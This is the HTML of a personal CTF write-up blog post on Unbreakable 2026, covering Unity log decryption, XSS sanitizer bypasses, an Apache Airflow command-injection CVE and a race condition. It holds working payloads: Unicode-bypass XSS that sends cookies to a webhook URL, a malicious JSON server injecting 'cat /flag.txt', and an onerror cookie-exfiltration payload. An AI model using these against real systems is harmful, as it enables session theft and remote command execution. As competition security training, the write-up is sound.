@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Unbreakable 2026 | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="ctf">
+<meta name="description" content="Overview
+Although my team didn&rsquo;t qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I&rsquo;d make one anyways. Just as a heads-up, I will only include the ones that I personally solved.
+
+Since we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn&rsquo;t really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/unr-2026/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/unr-2026/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/unr-2026/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Unbreakable 2026">
+  <meta property="og:description" content="Overview Although my team didn’t qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I’d make one anyways. Just as a heads-up, I will only include the ones that I personally solved.
+Since we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn’t really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-09T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Unbreakable 2026">
+<meta name="twitter:description" content="Overview
+Although my team didn&rsquo;t qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I&rsquo;d make one anyways. Just as a heads-up, I will only include the ones that I personally solved.
+
+Since we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn&rsquo;t really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Unbreakable 2026",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/unr-2026/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Unbreakable 2026",
+  "name": "Unbreakable 2026",
+  "description": "Overview Although my team didn\u0026rsquo;t qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I\u0026rsquo;d make one anyways. Just as a heads-up, I will only include the ones that I personally solved.\nSince we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn\u0026rsquo;t really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.\n",
+  "keywords": [
+    "ctf"
+  ],
+  "articleBody": "Overview Although my team didn’t qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I’d make one anyways. Just as a heads-up, I will only include the ones that I personally solved.\nSince we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn’t really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.\nI felt like almost none of these challenges were manageable without AI, but I do understand that making them palpable meant they could be solved in two prompts. Nevertheless, there were still some challenges that I enjoyed solving.\nNow, let’s actually get into the challenges!\nthe flag is a lie This was the first challenge I solved. Took me quite a while but I was proud of it.\nWe were provided with a small Unity game. And what immediately struck me as strange was that they also included a linux build for it. We get the sources and a TheFlagIsALie_Data folder, inluding the resourced the game was using, and an il2cpp_data folder.\nIf I thought about that earlier I wouldn’t have spent so much time on it; About all of game hacking is done on Windows, and the fact that we had a linux game meant this was NOT a game hacking challenge. I was very disappointed to find this out, because game hacking is why I got into cybersecurity in the first place. So I thought this was a pretty lame challenge.\nIf you don’t know il2cpp that means, is that reversing will get slightly more difficult. The game goes from C# to IL (intermediate language) which is executed by Mono. What Unity can do, is use il2cpp to turn that IL into very optimized C++ before compiling.\nThis was a first person game with two levels, the first one was pushing a box onto a pressure plate and the second was jumping on a moving plate to reach a flag mesh. Obviously that wasn’t the real flag, and trying to jump to it from the plate would just throw you into the water underneath and crash the game.\nThe first thing I did was go onto my Windows laptop, open Cheat Engine, nop the ExitGameOnTrigger function and explore the map. I didn’t find anything useful, so I found our player’s jump velocity and freezed it at a 3 to fly around the map, but there was still nothing.\nSo if this wasn’t the way to solve it, what was? I used AssetRipper next to extract all of the data, and found another secret level called DevLevel_DontShip.unity. This seemed interesting, so I exported the project and installed Unity to try and open it. I looked at level1, but it was almost completely empty except for some LogRecorder object. It also had a very obfuscated code attached to it:\n_o7677514b43(byte[] plaintext, byte[] key, out byte[] iv), which was an encryption function;\n_oc1e208cb7a, with 16 int fields, that calls _o36e07a77cc;\n_o36e07a77cc(out byte[] key), which produced a byte array key, taking each int from the array given by the previous function and turning it to a byte value, eventually creating the final key.\n(There were more functions but these were the most important).\nI started investigating it and found it also existed in the level0 scene, the one we were allowed to play.\nThere was also a Logs folder I didn’t pay much attention to at first, but now seemed relevant, containing an encoded session-20260225-111621.unrl. And .unrl is not a real extension, which I missed, oops.\nSo this challenge now looks like reversing the cryptography functions and decrypting the logs. The way to solve this was to look through all the resources for the _oc1e208cb7a string, which was found by Claude as 26c1c156a22d3174e5ebf7c1c8b94b6e. It was laying in the level1 file, right after the function name. Since the LogRecorder script, _o1b42fd6de7, was a [SerialReference] private object, it was just being saved as part of the scene, kind of like config data. It was computed once when the scene was generated and then just left to lay there.\nThen, after we decrypt the logs, they become csv data, with a bunch of entries with these fields: entity_id\tcreate_x, create_y, create_z, last_x, last_y, last_z, create_time, delete_time, lifetime. Now all we need to do is visualize this data. This took me a while, I tried using some online tools but nothing readable emerged, so I tried using ChatGPT and after about an hour I managed to extract the mirrored flag, by taking the final position of each entity, selecting the thin plane where all the letters exist (610.7 \u003c x \u003c 611.15) and taking the y and z and projecting them onto a 2d plane.\nThe tools for actually doing this, are pandas, numpy and matplotlib, something like this:\nplane = last[ (last[\"x\"] \u003e 610.7) \u0026 (last[\"x\"] \u003c 611.15) ] plt.scatter(plane[\"z\"], plane[\"y\"]) I was still disappointed this was just another cryptography challenge, but it was alright.\nUNR{certified_crate_pusher}\ndemolition This was definitely one of the easier ones.\nWe were provided with two websites, one some kind of html page renderer, where we could add a profile blob (p=) and a draft html (d=), and then an admin bot with the cookie as a flag. So just XSS.\nThere were two render engines in the source codes, a python one set by default and a go one, running a broken sanitizer. By setting our profile blob to p=render.engine=go we could reach the branch we can abuse. There was a python pre-filter which blocked just the ASCII ",
+  "wordCount" : "4687",
+  "inLanguage": "en",
+  "datePublished": "2026-03-09T00:00:00Z",
+  "dateModified": "2026-03-09T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/unr-2026/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Unbreakable 2026
+    </h1>
+    <div class="post-meta"><span title='2026-03-09 00:00:00 +0000 UTC'>March 9, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#the-flag-is-a-lie" aria-label="the flag is a lie">the flag is a lie</a></li>
+                <li>
+                    <a href="#demolition" aria-label="demolition">demolition</a></li>
+                <li>
+                    <a href="#nday-1" aria-label="nday-1">nday-1</a></li>
+                <li>
+                    <a href="#minegamble" aria-label="minegamble">minegamble</a></li>
+                <li>
+                    <a href="#svfgp" aria-label="svfgp">svfgp</a></li>
+                <li>
+                    <a href="#ram-vault-beacon-malware" aria-label="RAM Vault Beacon Malware">RAM Vault Beacon Malware</a></li>
+                <li>
+                    <a href="#relay-in-the-noise" aria-label="Relay in the Noise">Relay in the Noise</a></li>
+                <li>
+                    <a href="#toxicwaste" aria-label="toxicwaste">toxicwaste</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>Although my team didn&rsquo;t qualify for the finals this edition of Unbreakable, we still placed a decent score and since I enjoy making writeups I decided I&rsquo;d make one anyways. Just as a heads-up, I will only include the ones that I personally solved.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/scores.png#center"></p>
+<p>Since we were only two members, it was a little tough on us, and I stayed up the entire last night, but it didn&rsquo;t really make up for the lack of manpower. And this really felt more like a project management competiton; who can get their three agents to do the fastest, efficient and most work.</p>
+<p>I felt like almost <em>none</em> of these challenges were manageable without AI, but I do understand that making them palpable meant they could be solved in two prompts. Nevertheless, there were still some challenges that I enjoyed solving.</p>
+<p>Now, let&rsquo;s actually get into the challenges!</p>
+<h2 id="the-flag-is-a-lie">the flag is a lie<a hidden class="anchor" aria-hidden="true" href="#the-flag-is-a-lie">#</a></h2>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/top9.png#center"></p>
+<p>This was the first challenge I solved. Took me quite a while but I was proud of it.</p>
+<p>We were provided with a small Unity game. And what immediately struck me as strange was that they also included a <em>linux</em> build for it. We get the sources and a <code>TheFlagIsALie_Data</code> folder, inluding the resourced the game was using, and an <code>il2cpp_data</code> folder.</p>
+<p>If I thought about that earlier I wouldn&rsquo;t have spent so much time on it; About all of game hacking is done on Windows, and the fact that we had a linux game meant this was <em>NOT</em> a game hacking challenge. I was very disappointed to find this out, because game hacking is why I got into cybersecurity in the first place. So I thought this was a pretty lame challenge.</p>
+<p>If you don&rsquo;t know <code>il2cpp</code> that means, is that reversing will get slightly more difficult. The game goes from <code>C#</code> to <code>IL</code> (intermediate language) which is executed by Mono. What Unity can do, is use <code>il2cpp</code> to turn that <code>IL</code> into very optimized <code>C++</code> before compiling.</p>
+<p>This was a first person game with two levels, the first one was pushing a box onto a pressure plate and the second was jumping on a moving plate to reach a flag mesh. Obviously that wasn&rsquo;t the real flag, and trying to jump to it from the plate would just throw you into the water underneath and crash the game.</p>
+<p>The first thing I did was go onto my Windows laptop, open Cheat Engine, <code>nop</code> the <code>ExitGameOnTrigger</code> function and explore the map. I didn&rsquo;t find anything useful, so I found our player&rsquo;s jump velocity and freezed it at a 3 to fly around the map, but there was still nothing.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/walky.png#center"></p>
+<p>So if this wasn&rsquo;t the way to solve it, what was? I used AssetRipper next to extract all of the data, and found another secret level called <em>DevLevel_DontShip.unity</em>. This seemed interesting, so I exported the project and installed Unity to try and open it. I looked at <em>level1</em>, but it was almost completely empty except for some <code>LogRecorder</code> object. It also had a very obfuscated code attached to it:</p>
+<ul>
+<li>
+<p><code>_o7677514b43(byte[] plaintext, byte[] key, out byte[] iv)</code>, which was an encryption function;</p>
+</li>
+<li>
+<p><code>_oc1e208cb7a</code>, with 16 int fields, that calls <code>_o36e07a77cc</code>;</p>
+</li>
+<li>
+<p><code>_o36e07a77cc(out byte[] key)</code>, which produced a byte array key, taking each int from the array given by the previous function and turning it to a byte value, eventually creating the final key.</p>
+</li>
+</ul>
+<p>(There were more functions but these were the most important).</p>
+<p>I started investigating it and found it also existed in the level0 scene, the one we were allowed to play.</p>
+<p>There was also a <em>Logs</em> folder I didn&rsquo;t pay much attention to at first, but now seemed relevant, containing an encoded <code>session-20260225-111621.unrl</code>. And <code>.unrl</code> is not a real extension, which I missed, oops.</p>
+<p>So this challenge now looks like reversing the cryptography functions and decrypting the logs. The way to solve this was to look through all the resources for the <code>_oc1e208cb7a</code> string, which was found by Claude as <code>26c1c156a22d3174e5ebf7c1c8b94b6e</code>. It was laying in the level1 file, right after the function name. Since the LogRecorder script, <code>_o1b42fd6de7</code>, was a <code>[SerialReference]</code> private object, it was just being saved as part of the scene, kind of like config data. It was computed once when the scene was generated and then just left to lay there.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/key.png#center"></p>
+<p>Then, after we decrypt the logs, they become csv data, with a bunch of entries with these fields: <code>entity_id	create_x, create_y, create_z, last_x, last_y, last_z, create_time, delete_time, lifetime</code>. Now all we need to do is visualize this data. This took me a while, I tried using some online tools but nothing readable emerged, so I tried using ChatGPT and after about an hour I managed to extract the mirrored flag, by taking the final position of each entity, selecting the thin plane where all the letters exist <code>(610.7 &lt; x &lt; 611.15)</code> and taking the <code>y</code> and <code>z</code> and projecting them onto a 2d plane.</p>
+<p>The tools for <em>actually</em> doing this, are <code>pandas</code>, <code>numpy</code> and <code>matplotlib</code>, something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>plane <span style="color:#f92672">=</span> last[
+</span></span><span style="display:flex;"><span>    (last[<span style="color:#e6db74">&#34;x&#34;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">610.7</span>) <span style="color:#f92672">&amp;</span>
+</span></span><span style="display:flex;"><span>    (last[<span style="color:#e6db74">&#34;x&#34;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">611.15</span>)
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>scatter(plane[<span style="color:#e6db74">&#34;z&#34;</span>], plane[<span style="color:#e6db74">&#34;y&#34;</span>])
+</span></span></code></pre></div><p>I was still disappointed this was just another cryptography challenge, but it was alright.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/flag_mirror.png#center"></p>
+<p><code>UNR{certified_crate_pusher}</code></p>
+<h2 id="demolition">demolition<a hidden class="anchor" aria-hidden="true" href="#demolition">#</a></h2>
+<p>This was definitely one of the easier ones.</p>
+<p>We were provided with two websites, one some kind of html page renderer, where we could add a profile blob (<code>p=</code>) and a draft html (<code>d=</code>), and then an admin bot with the cookie as a flag. So just XSS.</p>
+<p>There were two render engines in the source codes, a <em>python</em> one set by default and a <em>go</em> one, running a broken sanitizer. By setting our profile blob to <code>p=render.engine=go</code> we could reach the branch we can abuse. There was a python pre-filter which blocked just the ASCII <code>&lt;script</code>, and then the Go sanitizer was doing <em>unicode case folding</em>. The line <code>strings.EqualFold(..)</code> means it was treating Unicode characters as equivalent ASCII doing comparison. So it would transform the weird unicode into ascii before rendering.</p>
+<p>You can guess where this is going - using <code>&lt;ſcript&gt;</code> was the whole bypass. So our payload looked like <code>&lt;ſcript&gt;location='https://webhook.site/960999bb-173d-4605-878c-b8afa5b55613/?c='+encodeURIComponent(document.cookie)&lt;/ſcript&gt;</code>; except I had to url-encode the entire <code>d</code> parameter for it to work, so <code>https://demolition.breakable.live/?p=render.engine%3Dgo&amp;d=%3C%C5%BFcript%3Ewindow.location.href%3D%60https%3A%2F%2Fwebhook.site%2F960999bb-173d-4605-878c-b8afa5b55613%2F%3Fc%3D%24%7BencodeURIComponent(document.cookie)%7D%60%3C%2F%C5%BFcript%3E</code>.</p>
+<p>Then, we just send that link to the bot, and get back the flag: <code>CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/flig.png#center"></p>
+<h2 id="nday-1">nday-1<a hidden class="anchor" aria-hidden="true" href="#nday-1">#</a></h2>
+<p>I actually liked this one. We&rsquo;re given an Apache Airflow website, without any source code, and admin credentials. This usually means we have to identify the most likely outdated framework and find a CVE that matches it.</p>
+<p>This was a DAG (Directed Acyclic Graph) website, which means the blueprint of your workflow. We can quickly identify this as <em>Apache airflow 3.0.4</em>, and I just searched for known CVEs that affect this version. After a while I found this one, <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-52213/version_id-2024493/year-2025/opec-1/Apache-Airflow-3.0.4.html">CVE-2025-54941</a>. This matched our website to a T, since it was a vulnerability in one of the default DAGs, <code>example_dag_decorator</code>, which could allow us to run commands on the server and view their logs on the website, since we were admin.</p>
+<p>A word about this CVE, basically this DAG was running this code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>external_ip <span style="color:#f92672">=</span> raw_json[<span style="color:#e6db74">&#34;origin&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;command&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;echo &#39;Seems like today your server executing Airflow is connected from IP </span><span style="color:#e6db74">{</span>external_ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So just basic command injection, where it was taking the raw json from the remote API (or so it thought!) and returning the output inside an echo command.</p>
+<p>I hosted a cloudflared website with this script running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">H</span>(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;origin&#34;</span>: <span style="color:#e6db74">&#34;&#39;; cat /flag.txt ; echo &#39;&#34;</span>}
+</span></span><span style="display:flex;"><span>        body <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(payload)<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json&#34;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Content-Length&#34;</span>, str(len(body)))
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>end_headers()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(body)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTPServer((<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, <span style="color:#ae81ff">8000</span>), H)<span style="color:#f92672">.</span>serve_forever()
+</span></span></code></pre></div><p>Now, we just need the server to execute the DAG with our malicious cloudflared tunnel. We just connect to the website as admin, fetch the cookie, and trigger the DAG like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NOW<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>date -u +<span style="color:#e6db74">&#34;%Y-%m-%dT%H:%M:%SZ&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -s -X POST <span style="color:#e6db74">&#34;</span>$BASE<span style="color:#e6db74">/api/v2/dags/example_dag_decorator/dagRuns&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    \&#34;logical_date\&#34;:\&#34;</span>$NOW<span style="color:#e6db74">\&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    \&#34;conf\&#34;:{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      \&#34;url\&#34;:\&#34;https://server.trycloudflare.com\&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#34;</span>
+</span></span></code></pre></div><p>And pretty quickly we get the flag, in the <code>echo_ip_info</code> logs:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/flegj.png#center"></p>
+<p><code>CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}</code></p>
+<h2 id="minegamble">minegamble<a hidden class="anchor" aria-hidden="true" href="#minegamble">#</a></h2>
+<p>This was probably my favorite challenge! It was very creative and funny.</p>
+<p>The first part was pretty easy, we essentially needed the <em>Owner</em> role to get access to an Admin Support Ticket tab. And we just needed a lot of money. The actions we could do were buy an item, and then sell it with a 10% tax. There was also a <em>gamble</em> section but it didn&rsquo;t look too interesting to me.</p>
+<p>I pretty quickly figured out it was a race condition attack, so we can just send a bunch of <em>sell</em> requests at the same time and they would all get validated and give us money. I can proudly say I only used my brain for this.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/timing.png#center"></p>
+<p>Now the next part was a little trickier! We have access to the Admin Support Ticket, and we <em>can</em> execute XSS in the ticket&rsquo;s body (not subject) because something isn&rsquo;t being sanitized properly; and there was also an interesting script included in the view ticket page&rsquo;s html, <em>telemetry.js</em>. What it did was kind of:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flushCrashLogs</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logSink</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">crashReportSink</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;/api/diagnostics/log&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">state</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cookie</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">bunch</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">stuff</span> <span style="color:#a6e22e">that</span> <span style="color:#a6e22e">doesn</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">t</span> <span style="color:#a6e22e">matter</span>
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">logSink</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?ctx=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">state</span>)));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So we needed to make a XSS payload that would somehow overwrite this <code>window.crashReportSink</code> to our own malicious free cloudflared tunnel.</p>
+<p>At first I tried something like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#e6db74">&#34;body&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&lt;img src=x onerror=window.crashReportSink=&#39;https://webhook.site/8e94c29e-a5e1-4d95-a6d9-7380ef2bb3c7&#39;;flushCrashLogs()&gt;&#34;</span> 
+</span></span></code></pre></div><p>But it didn&rsquo;t work because of the CSP which blocked inline JS. So we needed to find another way to make the website think that <code>window.crashReportSink</code> was our website, and somehow trigger the script with some sort of error.</p>
